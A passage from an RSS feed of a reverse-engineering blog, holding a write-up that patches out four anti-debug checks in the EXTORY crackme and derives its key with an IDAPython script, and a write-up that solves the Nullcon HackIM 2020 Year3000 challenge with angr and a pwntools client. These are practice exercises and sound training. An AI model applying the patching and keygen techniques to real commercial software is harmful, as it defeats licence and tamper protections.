      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/extory/thumb.png" title="banner" class="gallery-item"><img src="/img/extory/thumb.png" alt="banner"></a></p><p>This will be a detailed writeup of EXTORY crackme from crackmes.one. As always I’ll try to make it easy to understand as much as possible so It’ll be longer than usual (with more than 30 screenshots XD). Also Make sure to leave some feedback as it took much more time as compared to my previous writeups.   </p><h1 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR;"></a>TLDR;</h1><p>Basically this crackme has 4 anti-debug checks(acc. to me). And I think its hard to solve it statically. There are many techniques that is often found in malwares. So it is worth to check it out. If you have not tried it, I’d advice you to please do and then continue with this writeup. I’ve also used a no. of tools for different purposes.  </p><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>Download <a href="https://crackmes.one/crackme/5e0618c633c5d419aa013483"  target="_blank">EXTORY’s Crackme</a>    </p></blockquote><hr><h1 id="Initial-Analysis"><a href="#Initial-Analysis" class="headerlink" title="Initial Analysis"></a>Initial Analysis</h1><p>As usual, We have to guess the right password and it will show the ‘Correct’ text in the app.  </p><p>For this I used DIE tool. Its a 64bit exe and uses MSVCP.<br>So I began by searching for some strings and found that there is no <strong>‘Correct’</strong> and <strong>‘Wrong’</strong> string.<br>But searching in Unicode strings I found some interesting stuff.  </p><p><a href="/img/extory/die.png" class="gallery-item"><img src="/img/extory/die.png"></a>  </p><p>Also In crypto tab we find an anti-debug technique.  </p><p><a href="/img/extory/die2.png" class="gallery-item"><img src="/img/extory/die2.png"></a>  </p><p>Cool, Now its time to hop over to IDA.<br>Make sure to enable UNICODE strings.  </p><p><a href="/img/extory/unicode.png" class="gallery-item"><img src="/img/extory/unicode.png"></a>  </p><p>So we find their references and I observed that there is some thread stuff.  </p><p>After that I find that the ExitCode of that Thread is being compared to 1 and if its true we continue to use some <strong>‘hgblelelbkjjgldd’</strong> else <strong>‘hielblaldkdd’</strong>.<br>Ahh it seems like these could be our ‘Correct’ and ‘Wrong’ strings but encrypted.  </p><p><a href="/img/extory/cmp.png" class="gallery-item"><img src="/img/extory/cmp.png"></a>  </p><p>Now We can switch over to our nice Decompiler View to get more insight into this encryption function and maybe our password is encrypted in the same way.  </p><p><a href="/img/extory/1.png" class="gallery-item"><img src="/img/extory/1.png"></a>  </p><p>We can observe that <em>WaitForSingleObject</em> is called which checks whether the function has exited then the handle to the thread and the pointer to variable which stores the exitcode is passed to the <em>GetExitCodeThread</em> function. And Finally it compares the exitcode to 1.  </p><p><a href="/img/extory/2.png" class="gallery-item"><img src="/img/extory/2.png"></a>  </p><p>The decryption algo is pretty simple and the same for both the strings.<br>It is as follows:<br><code>(enc[i] + 10 * enc[i+1] - 1067)</code></p><p><a href="/img/extory/3.png" class="gallery-item"><img src="/img/extory/3.png"></a>  </p><p>So I wrote a short python script to break it down what it does.<br>It is self explanatory.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;hgblelelbkjjgldd&quot;</span> <span class="comment">#Correct!</span></span><br><span class="line"><span class="comment">#enc = &quot;hielblaldkdd&quot;     Wrong!</span></span><br><span class="line">dec = <span class="string">&quot;&quot;</span></span><br><span class="line">v23 = <span class="built_in">len</span>(enc)</span><br><span class="line">v25 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(v25 &lt; v23):</span><br><span class="line">  c = <span class="built_in">ord</span>(enc[v25])</span><br><span class="line">  d = <span class="built_in">ord</span>(enc[v25+<span class="number">1</span>])</span><br><span class="line">  v27 = c + <span class="number">10</span> * d;</span><br><span class="line">  v25 += <span class="number">2</span>;</span><br><span class="line">  dec += <span class="built_in">chr</span>(v27-<span class="number">1067</span>)</span><br><span class="line"><span class="built_in">print</span> dec</span><br></pre></td></tr></table></figure><p>So now whats next?<br>Well I started to study the decompiled code of the Thread which does all the work in this crackme.<br>But It was troublesome to analyse it further statically so I used IDA to debug it.  </p><p>So I placed a breakpoint just before the execution of the thread and it exited :(</p><a href="/img/extory/idaexit.gif" title="idaexit" class="gallery-item"><img src="/img/extory/idaexit.gif" alt="idaexit"/></a>  <hr><h1 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h1><p>So In this tutorial/writeup I’ll toggle between IDA and x64dbg as it becomes more easy to understand and patch it at the same time.    </p><p>Also first things first.. You should disable ASLR with the help of CFF Explorer.</p><p><a href="/img/extory/cff.png" class="gallery-item"><img src="/img/extory/cff.png"></a>  </p><p>Just uncheck the <strong>DLL can move</strong> option and save the executable.<br>Now load the exe in x64dbg and just keep on stepping.<br>By Trial and Error we get to know that the <strong>fcn.1000</strong> is responsible for closing our debugger.   </p><p><a href="/img/extory/p1.png" class="gallery-item"><img src="/img/extory/p1.png"></a>  </p><p>We step into it and again find another function ie. <strong>fcn.1D10</strong> and please keep in mind keep on saving our database so that our breakpoints are remembered by x64dbg.  </p><p><a href="/img/extory/p2.png" class="gallery-item"><img src="/img/extory/p2.png"></a>  </p><p>We now step within the fcn.1D10 function and start analysing it as it looks interesting.<br>At the very beginning it calls a function 4 times ie. <strong>fcn.2050</strong>  </p><p><a href="/img/extory/p3.png" class="gallery-item"><img src="/img/extory/p3.png"></a>  </p><p>It’d be easy to just look into IDA’s decompiled version of the function as it has some weird assembly.  </p><p><a href="/img/extory/p4.png" class="gallery-item"><img src="/img/extory/p4.png"></a>  </p><p>Cool The decompiled version matches and some data is passed to the function  </p><p><a href="/img/extory/p5.png" class="gallery-item"><img src="/img/extory/p5.png"></a>  </p><p>If you’ll check it, the function is a little bit scary at first.<br>But basically it justs <em>xors the bytes with 0xD9</em> from the data passed to it and returns it.  </p><p><a href="/img/extory/p6.png" class="gallery-item"><img src="/img/extory/p6.png"></a><br>Like the bytes above decrypts to <strong>x64dbg.exe</strong>.  </p><p><a href="/img/extory/p7.png" class="gallery-item"><img src="/img/extory/p7.png"></a>  </p><p>And after it executes 4 times, the registers look like this and the 4 strings decrypted are :</p><ul><li>x64dbg.exe  </li><li>Taskmgr.exe  </li><li>javaw.exe  </li><li>ida64.exe  </li></ul><p><a href="/img/extory/p8.png" class="gallery-item"><img src="/img/extory/p8.png"></a>  </p><p>Now we continue with the decompiled code and at the last its looking suspicious hmm..  </p><p><a href="/img/extory/p9.png" class="gallery-item"><img src="/img/extory/p9.png"></a>  </p><p>It checks the return code of the <strong>fcn.2370</strong> which later decides whether to terminate the process. And the fcn.2370 uses some functions to get the list of running processes.<br>I keep on stepping and find that it finds <code>smss.exe, csrss.exe, wininit.exe, services.exe, winlogon.exe, etc</code>.</p><p><em>Reference</em> :<br><a href="https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes">https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes</a>  </p><p>I guess here it simply checks whether the list contains any string which we decrypted previously and decides the return code accordingly. </p><blockquote><p>It’ll close every process from those 4 .. Not your current debugger.   </p></blockquote><hr><h1 id="Patching-amp-Fun"><a href="#Patching-amp-Fun" class="headerlink" title="Patching &amp; Fun"></a>Patching &amp; Fun</h1><p>Now we can patch the if statement in such a way that it has a minimum effect over the program and also keeping in mind that it should work  with and without a debugger.<br>PS We can also just rename our debugger to bypass this check though.  </p><p><a href="/img/extory/p10.png" class="gallery-item"><img src="/img/extory/p10.png"></a>  </p><p>In the screenshot above, the <em><code>TEST EAX,EAX</code></em>  checks whether the return code of <strong>fcn.2370</strong> is 0. We want to always skip the terminate instructions so I patched it to <em>a XOR and JMP</em> and saved it.   </p><p><a href="/img/extory/p11.png" class="gallery-item"><img src="/img/extory/p11.png"></a>  </p><p>But I guess there is more to it.<br>After executing the patched version the EIP gets to an invalid instruction ie. 0x12345678.    </p><p><a href="/img/extory/p12.png" class="gallery-item"><img src="/img/extory/p12.png"></a></p><p>Upon analysing it again I found  that we still can’t pass the fcn.1000.<br><a href="/img/extory/p13.png" class="gallery-item"><img src="/img/extory/p13.png"></a>  </p><p>Just somewhat below the fcn.1D10 in fcn.1000 we get <strong>fcn.2540</strong> which does this.  </p><p><a href="/img/extory/p14.png" class="gallery-item"><img src="/img/extory/p14.png"></a><br>Its a very short one and just loads the address of Process Environment Block(ie. value of GS:[60] from the Thread Information Block), loads the byte at 0x2 index ie. BeingDebugged flag. If its true then it will load <code>0x12345678</code> into EAX and calls it which halts the program execution.  </p><p><em>Reference</em> :<br><a href="https://en.wikipedia.org/wiki/Win32_Thread_Information_Block">https://en.wikipedia.org/wiki/Win32_Thread_Information_Block</a><br><a href="https://www.aldeid.com/wiki/PEB-Process-Environment-Block/BeingDebugged">https://www.aldeid.com/wiki/PEB-Process-Environment-Block/BeingDebugged</a>  </p><p><a href="/img/extory/p15.png" class="gallery-item"><img src="/img/extory/p15.png"></a>  </p><p><a href="/img/extory/p16.png" class="gallery-item"><img src="/img/extory/p16.png"></a>    </p><p>We can simply NOP those <em>MOV and CALL instructions</em> and save it.  </p><p><a href="/img/extory/p17.png" class="gallery-item"><img src="/img/extory/p17.png"></a>    </p><p>Ahh There is another too… but this looks same but instead of 0x12345678, it sets EIP to <code>0xDEADC0DE</code>.  </p><p><a href="/img/extory/p18.png" class="gallery-item"><img src="/img/extory/p18.png"></a>    </p><p>This is also just below the previous antidebug check. But it compares some other parts from PEB. So I checked out at 0x20 .. there is <em>FastPebLockRoutine</em>  which has the address of fast-locking routine for PEB. I didn’t get anything about why is it comparing bytes at that address to 0x2001.    </p><p><a href="/img/extory/p19.png" class="gallery-item"><img src="/img/extory/p19.png"></a>   </p><p>I just nopped the faulty instructions and again saved it.<br>Just to keep a track, this was our 3rd patched exe.   </p><p><a href="/img/extory/p20.png" class="gallery-item"><img src="/img/extory/p20.png"></a>      </p><p>Again after executing the patched executable we get another <code>DEADC0DE</code>.<br>This is not cool anymore lol.<br>We can now just check how much <code>DEADC0DE</code> exists. Just Right Click and ..<br> <code>Search for -&gt; Current Module -&gt; Constant</code><br>And enter <code>DEADC0DE</code></p><p><a href="/img/extory/p21.png" class="gallery-item"><img src="/img/extory/p21.png"></a>      </p><p>Cool There is only one found. We jump to the location and find that it is pretty much similar to the one we just patched.  </p><p><a href="/img/extory/p22.png" class="gallery-item"><img src="/img/extory/p22.png"></a>      </p><p>So we patch it in the same way we did the previous one.<br>And to my surprise it doesn’t halt or exits anymore.. That means we have bypassed all anti-debug checks.  </p><hr><h1 id="KeyGen"><a href="#KeyGen" class="headerlink" title="KeyGen"></a>KeyGen</h1><p>For getting our correct key, I’ll use IDA WinDebugger as its graph view is helpful for now.    </p><p><a href="/img/extory/p23.png" class="gallery-item"><img src="/img/extory/p23.png"></a>      </p><p>Ok, The StartAddress is loaded and passed into CreateThread.  </p><p><a href="/img/extory/p24.png" class="gallery-item"><img src="/img/extory/p24.png"></a>      </p><p>So our main function to put a breakpoint is <strong>sub.1A30</strong>.  </p><p><a href="/img/extory/p25.png" class="gallery-item"><img src="/img/extory/p25.png"></a>      </p><p>The first cmp instruction is the same we just patched as you can refer from the multiple nop instructions just after it.   </p><p><a href="/img/extory/p26.png" class="gallery-item"><img src="/img/extory/p26.png"></a>      </p><p>After that we have a loop that stores our input_key’s length into rax basically by looping it and checking it against a null byte. And If it is below 0x10 ie. 16 characters it displays wrong_key so the next time I entered something random like <strong>hell65abhell78cd</strong>.  </p><p><a href="/img/extory/p27.png" class="gallery-item"><img src="/img/extory/p27.png"></a>      </p><p>Later it xors our input_key bytes with 0xCD in a loop.  </p><p><a href="/img/extory/p28.png" class="gallery-item"><img src="/img/extory/p28.png"></a>      </p><p>And In next loop it xors 16 bytes (step = 2) at <strong>var_68</strong> and <strong>var_40</strong>.<br><a href="/img/extory/p29.png" class="gallery-item"><img src="/img/extory/p29.png"></a>      </p><p>And now something obvious happens.. It compares our xored input_key with the bytes we got from xoring var_68 and Var_40.  </p><p><a href="/img/extory/p30.png" class="gallery-item"><img src="/img/extory/p30.png"></a>      </p><p>Now we know that it is a simple XOR encryption which we can easily reverse.  </p><p>So I wrote an IDApython script which gets our key.<br>PS The addresses here can vary on your system.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v68, v40 = [], []</span><br><span class="line">v68_beg = <span class="number">0x0020FFEF0</span></span><br><span class="line">v68_end = v68_beg + <span class="number">32</span></span><br><span class="line">v40_beg = <span class="number">0x0020FFF18</span></span><br><span class="line">v40_end = v40_beg + <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> ea <span class="keyword">in</span> <span class="built_in">range</span>(v68_beg,v68_end,<span class="number">2</span>):</span><br><span class="line">    v68.append( Byte(ea) )</span><br><span class="line"><span class="keyword">for</span> ea <span class="keyword">in</span> <span class="built_in">range</span>(v40_beg,v40_end,<span class="number">2</span>):</span><br><span class="line">    v40.append( Byte(ea) )</span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x,y <span class="keyword">in</span> <span class="built_in">zip</span>(v68,v40):</span><br><span class="line">    key += <span class="built_in">chr</span>((x^y) ^ <span class="number">0xCD</span>)</span><br><span class="line"><span class="built_in">print</span> key</span><br></pre></td></tr></table></figure><p>This outputs</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">5AquUR%</span><span class="bash">mH4tE=Yn9</span></span><br></pre></td></tr></table></figure><p><a href="/img/extory/solved.png" class="gallery-item"><img src="/img/extory/solved.png"></a>      </p><p>And Hey Finally We get the <code>Correct!</code> Text in green.<br>That was very satisfying, I hope the feeling is mutual.  </p><a href="https://media.giphy.com/media/g7X5T9PuUBAzu/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/g7X5T9PuUBAzu/giphy.gif" alt="drawing" width="300"/></a>  <p>See yall in next writeup about another crackme.<br>Next time I’m thinking maybe .NET will be fun.  </p><p>Don’t forget to hit me up on <a href="https://twitter.com/MrT4ntr4"  target="_blank">Twitter</a>. </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/crackmes-one/">crackmes.one</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/anti-debug/">anti-debug</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/crackme/">crackme</category>
      
      
      <comments>https://mrt4ntr4.github.io/EXTORY-Crackme/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Nullcon HackIM CTF &#39;20 [Year3000-RE]</title>
      <link>https://mrt4ntr4.github.io/Nullcon-HackIM-Year3000/</link>
      <guid>https://mrt4ntr4.github.io/Nullcon-HackIM-Year3000/</guid>
      <pubDate>Mon, 10 Feb 2020 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/nullcon/thumb.png" title="banner" class="gallery-item"><img src="/img/nullcon/thumb.png" alt="banner"></a></p><p>So after such a long break I finally have something for you guys.<br>Also I’ll post something in every week from now on.<br>Spoiler.. Another writeup coming in a few days.  </p><p>Today we’ll solve a challenge from Nullcon HackIM CTF which is organised every year.<br>I remember, previous year I was only able to solve 2 challenges XD</p><hr><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>One day when I came home at lunchtime I heard a funny noise Went out to the back yard to find out If it was one of those rowdy boys Stood there was my neighbor called Peter And a flux capacitor I guess there must be quite some entropy in a flux capacitor…</p></blockquote><blockquote><p><code>nc re.ctf.nullcon.net 1234</code><br><strong>Download :</strong>   <a href="/files/nullcon/year3000.tar.gz"  target="_blank">year3000.tar.gz</a>  </p></blockquote><p>Ahh We are given 3000 binaries which we have to crack and send the solution to the server which prompts with a random binary name.  </p><p>But there’s a twist, the binaries are not of the similar architecture.. There are 64 bit and 32 bit versions mixed up.  </p><p>But basically every binary accepts an input and calls another function to check it.  </p><p><a href="/img/nullcon/ida1.png" class="gallery-item"><img src="/img/nullcon/ida1.png"></a>   </p><p>So we get to know that our input length is 100.<br>The Decompiled version of the check_fcn is :  </p><p><a href="/img/nullcon/ida2.png" class="gallery-item"><img src="/img/nullcon/ida2.png"></a>   </p><p>There’s a check for a single random byte from our input and then some last bytes of our input is compared with some predefined bytes in every binary.   </p><hr><h2 id="My-Approach"><a href="#My-Approach" class="headerlink" title="My Approach"></a>My Approach</h2><p>So long story short, I solved it using angr which is unintended. XD<br>I know it sounds a bit crazy but I didn’t had much time to look at this challenge as I wanted to spend my time on another challenge.<br>The server accepts our response within 7 secs else it’ll respond with <em>too slow…</em> so we can’t use angr with the server.<br>Also its only takes max 10-15 secs to solve a single binary using angr so I decided I’ll just run this script in 3-4 tabs and also asked my friend so that it gets solved in minimum time.<br>If I remember we were 5-6th solver of this challenge so it was pretty feasible.<br>I just wrote this as I didn’t find any other solution using angr for this problem after the ctf ended.  </p><p>The main problem was how to reduce the time to crack a single binary.</p><p>Basically my idea was to run the script in multiple tabs and divide the binaries into chunks so that we get the solutions along with their filenames to individual csv files.<br>We can later join the individual files and use that to send our results to the server.  </p><hr><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We begin by loading the binary as a project in angr and use the simplest entry state. I tried with a blank state but I was unlucky as there were differect architectures for binaries and there were some inconsistencies in addresses. And yeah I also tried to deal with that with a simple check case but nothing helped.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proj = angr.Project(path)</span><br><span class="line">state = proj.factory.entry_state(add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">simulation = proj.factory.simgr(state)</span><br></pre></td></tr></table></figure><p>Now How can we determine the solution state?<br>Well angr has different options..<br>Like we can specify the addresses which we want to be reached by our solver and the other which we want to avoid.<br>But angr also supports boolean values in <em>find</em> and <em>avoid</em> arguments.<br>Since the binaries our PIE enabled and also architectures differ we can make use of their output to check if we have found a valid solution.   </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span>(<span class="params">state</span>):</span></span><br><span class="line">  output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Well done&#x27;</span> <span class="keyword">in</span> output </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">failed</span>(<span class="params">state</span>):</span></span><br><span class="line">  output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;You have failed&#x27;</span> <span class="keyword">in</span> output </span><br></pre></td></tr></table></figure><p>Now we just use our simulation manager to execute it symbolically and specify the return values and we are good to go.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation.explore(find=success, avoid=failed)</span><br></pre></td></tr></table></figure><p>For further exploration you can visit the official <a href="https://docs.angr.io/" target="_blank">docs</a>.</p><h4 id="Final-Script"><a href="#Final-Script" class="headerlink" title="Final Script"></a>Final Script</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr,claripy</span><br><span class="line"><span class="keyword">import</span> sys,csv,time</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;cle.loader&#x27;</span>).setLevel(<span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line">w = csv.writer(<span class="built_in">open</span>(<span class="string">&quot;output.csv&quot;</span>, <span class="string">&quot;a&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">path</span>):</span></span><br><span class="line">  begin = time.time()</span><br><span class="line">  proj = angr.Project(path)</span><br><span class="line">  state = proj.factory.entry_state(add_options=&#123;angr.options.LAZY_SOLVES&#125;)</span><br><span class="line">  simulation = proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">success</span>(<span class="params">state</span>):</span></span><br><span class="line">    output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Well done&#x27;</span> <span class="keyword">in</span> output </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">failed</span>(<span class="params">state</span>):</span></span><br><span class="line">    output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You have failed&#x27;</span> <span class="keyword">in</span> output </span><br><span class="line"></span><br><span class="line">  simulation.explore(find=success, avoid=failed)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    sol_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    sol = sol_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">    <span class="built_in">print</span> colored(path, <span class="string">&#x27;yellow&#x27;</span>),</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;(&#123;&#125; secs)&quot;</span>.<span class="built_in">format</span>(<span class="built_in">round</span>(time.time()-begin,<span class="number">2</span>))</span><br><span class="line">    enc = b64encode(sol)</span><br><span class="line">    w.writerow([path, enc])</span><br><span class="line">    <span class="built_in">print</span> enc</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;No Sol found for &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3000</span>):</span><br><span class="line">     solve(<span class="string">&quot;&#123;&#125;.bin&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure><p><a href="/img/nullcon/out.png" class="gallery-item"><img src="/img/nullcon/out.png"></a>    </p><blockquote><p>And also please don’t forget to use <strong>LAZY_SOLVES</strong> here as it takes half of the time in many cases.   </p></blockquote><p>The screenshot below depicts the time taken to generate a solution state without using lazy solves.  </p><p><a href="/img/nullcon/out_without_lazysolve.png" class="gallery-item"><img src="/img/nullcon/out_without_lazysolve.png"></a>   </p><p>Finally It took around 3-4 hours to solve 3000 binaries.. phew  </p><p>Then I just merged the csv files altogether and sent the solution for the required binary.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;re.ctf.nullcon.net&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line">recvbin =  (r.recvline().strip())</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;final.csv&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">reader = csv.reader(f)</span><br><span class="line">binlist = <span class="built_in">list</span>(reader)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> binlist:</span><br><span class="line">    <span class="keyword">if</span>(x[<span class="number">0</span>] == recvbin):</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&quot;SENDING&quot;</span>, x[<span class="number">1</span>]</span><br><span class="line">      r.sendline(x[<span class="number">1</span>])</span><br><span class="line">      <span class="built_in">print</span> r.recvline()</span><br><span class="line">      recvbin = r.recvline().strip()</span><br><span class="line">      <span class="built_in">print</span> recvbin</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="/img/nullcon/conn.png" class="gallery-item"><img src="/img/nullcon/conn.png"></a>   </p><p>And thats how we travelled to the year 3000 XD  </p><a href="https://media.giphy.com/media/3o7TKnvDNYADdLYZIQ/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/3o7TKnvDNYADdLYZIQ/giphy.gif" alt="drawing" width="300"/></a>  <p>Also the challenge source was disclosed by the admins on github and you can try it locally using the Dockerfile.  </p><blockquote><p>Github Source <a href="https://github.com/nullcon/hackim-2020/tree/master/re/year3000"  target="_blank">year3000</a></p></blockquote><p>I hope you guys liked it.<br>Feedbacks are appreciated !<br>See yall in next writeup :)</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/nullcon/">nullcon</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/angr/">angr</category>
      
      
      <comments>https://mrt4ntr4.github.io/Nullcon-HackIM-Year3000/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UTC-CTF &#39;19 Teaser [Stacks-RE]</title>
      <link>https://mrt4ntr4.github.io/UTC-Teaser-Stacks/</link>
      <guid>https://mrt4ntr4.github.io/UTC-Teaser-Stacks/</guid>
      <pubDate>Sun, 22 Dec 2019 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
